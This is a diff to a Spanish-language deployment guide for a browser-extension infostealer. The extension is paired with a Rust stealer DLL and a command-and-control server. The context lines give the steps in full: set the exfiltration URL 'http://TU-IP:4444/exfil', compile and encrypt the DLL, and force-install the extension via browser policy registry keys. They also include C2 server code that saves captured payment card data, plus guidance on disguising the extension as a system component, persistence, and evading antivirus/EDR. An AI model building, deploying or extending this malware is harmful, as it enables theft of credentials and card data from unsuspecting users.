@@ -1,10 +1,10 @@
-# 🚀 Instalación y Uso de la Extensión Stealer
+#  Instalación y Uso de la Extensión Stealer
 
-## ✅ Estado Actual
+##  Estado Actual
 
 **Implementación completa** lista para usar:
 
-### ✓ Archivos Creados
+###  Archivos Creados
 
 ```
 chromium-extension/
@@ -23,9 +23,9 @@ stealer-dll/src/stealer/
 
 ---
 
-## 📦 Pasos para Deployment
+##  Pasos para Deployment
 
-### 1️⃣ Crear Iconos Falsos
+### 1⃣ Crear Iconos Falsos
 
 **Opción A - Extraer de Windows:**
 
@@ -45,7 +45,7 @@ Copiar a: `chromium-extension/`
 
 ---
 
-### 2️⃣ Configurar URL del C2
+### 2⃣ Configurar URL del C2
 
 Editar `chromium-extension/background.js` línea 6:
 
@@ -55,7 +55,7 @@ const C2_SERVER = 'http://TU-IP:4444/exfil';  // ← Cambiar aquí
 
 ---
 
-### 3️⃣ Compilar Stealer DLL
+### 3⃣ Compilar Stealer DLL
 
 ```bash
 # En Kali o Windows
@@ -65,7 +65,7 @@ cargo build --release -p stealer-dll
 
 ---
 
-### 4️⃣ Copiar Extensión junto al DLL
+### 4⃣ Copiar Extensión junto al DLL
 
 ```bash
 # Copiar carpeta de extensión
@@ -77,7 +77,7 @@ xcopy /E /I chromium-extension target\release\chromium-extension
 
 ---
 
-### 5️⃣ Encriptar y Desplegar
+### 5⃣ Encriptar y Desplegar
 
 ```bash
 cd builder
@@ -90,7 +90,7 @@ cargo run --release -- encrypt-module
 
 ---
 
-## 🎯 Uso desde el C2
+##  Uso desde el C2
 
 ### Comando 1: Instalar Extensión
 
@@ -124,14 +124,14 @@ pub extern "C" fn check_extension(browser: *const c_char) -> bool {
 
 ---
 
-## 🔄 Flujo de Trabajo
+##  Flujo de Trabajo
 
 ### Primera Ejecución (Setup)
 
 1. **Agent ejecuta `/install_extension`**
    ```
    C2> /install_extension
-   ✅ Extensión instalada en: ["Chrome", "Edge", "Brave"]
+    Extensión instalada en: ["Chrome", "Edge", "Brave"]
    ```
 
 2. **Usuario reinicia navegador**
@@ -158,7 +158,7 @@ exfiltrateData('autofill', cardData);
 
 ---
 
-## 🔍 Endpoint del C2
+##  Endpoint del C2
 
 ### Agregar en `c2r2-server/src/main.rs`
 
@@ -170,18 +170,18 @@ async fn handle_exfil(
 ) -> impl IntoResponse {
     // Parsear datos JSON
     let data: serde_json::Value = serde_json::from_str(&body).unwrap();
-    
+
     // Guardar en archivo
     let timestamp = chrono::Utc::now().format("%Y%m%d_%H%M%S");
-    let filename = format!("harvested/extension_{}_{}.json", 
+    let filename = format!("harvested/extension_{}_{}.json",
         data["browser"]["browser"].as_str().unwrap_or("unknown"),
         timestamp
     );
-    
+
     std::fs::write(&filename, body)?;
-    
-    println!("💳 Tarjeta capturada: {}", filename);
-    
+
+    println!(" Tarjeta capturada: {}", filename);
+
     StatusCode::OK
 }
 
@@ -191,7 +191,7 @@ async fn handle_exfil(
 
 ---
 
-## 📊 Formato de Datos Recibidos
+##  Formato de Datos Recibidos
 
 ```json
 {
@@ -217,9 +217,9 @@ async fn handle_exfil(
 
 ---
 
-## 🛡️ Evasión de Detección
+##  Evasión de Detección
 
-### ✅ Pasar Desapercibido
+###  Pasar Desapercibido
 
 1. **Nombre Legítimo**
    ```json
@@ -239,7 +239,7 @@ async fn handle_exfil(
    - Solo permisos comunes
    - Evitar `cookies`, `history`, etc.
 
-### ✅ Si Usuario Revisa Extensiones
+###  Si Usuario Revisa Extensiones
 
 - **Aparece como extensión del sistema**
 - **Nombre y descripción parecen legítimos**
@@ -247,24 +247,24 @@ async fn handle_exfil(
 
 ---
 
-## ⚙️ Persistencia
+##  Persistencia
 
 ### Sobrevive a:
-- ✅ Reinicio del navegador
-- ✅ Reinicio del sistema
-- ✅ Actualización del navegador
+-  Reinicio del navegador
+-  Reinicio del sistema
+-  Actualización del navegador
 
 ### No sobrevive a:
-- ❌ Desinstalación manual de la extensión
-- ❌ Reinstalación del navegador
-- ❌ Limpieza de registry
+-  Desinstalación manual de la extensión
+-  Reinstalación del navegador
+-  Limpieza de registry
 
 ### Solución:
 Volver a ejecutar `/install_extension` si se detecta que fue removida.
 
 ---
 
-## 🎯 Testing
+##  Testing
 
 ### Test Local (Sin C2)
 
@@ -297,7 +297,7 @@ Volver a ejecutar `/install_extension` si se detecta que fue removida.
 
 ---
 
-## 📈 Métricas de Éxito
+##  Métricas de Éxito
 
 **Detectabilidad**: ⭐⭐⭐⭐⭐ (5/5 - Prácticamente Indetectable)
 
@@ -309,7 +309,7 @@ Volver a ejecutar `/install_extension` si se detecta que fue removida.
 
 ---
 
-## 🚨 Troubleshooting
+##  Troubleshooting
 
 ### Extensión no se instala
 
@@ -326,7 +326,7 @@ reg query "HKCU\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist"
 
 **Problema**: C2 offline o URL incorrecta
 
-**Solución**: 
+**Solución**:
 1. Verificar `C2_SERVER` en `background.js`
 2. Ver storage del navegador:
    ```javascript
@@ -347,7 +347,7 @@ pub fn install_opera(&self) -> Result<(), Box<dyn std::error::Error>> {
 
 ---
 
-## ✅ Checklist Pre-Deployment
+##  Checklist Pre-Deployment
 
 - [ ] Iconos PNG creados (16, 48, 128)
 - [ ] URL del C2 configurada en background.js
@@ -360,4 +360,4 @@ pub fn install_opera(&self) -> Result<(), Box<dyn std::error::Error>> {
 
 ---
 
-**🎉 RESULTADO FINAL**: Bypass completo de App-Bound Encryption v20, prácticamente indetectable por AV/EDR.
+** RESULTADO FINAL**: Bypass completo de App-Bound Encryption v20, prácticamente indetectable por AV/EDR.
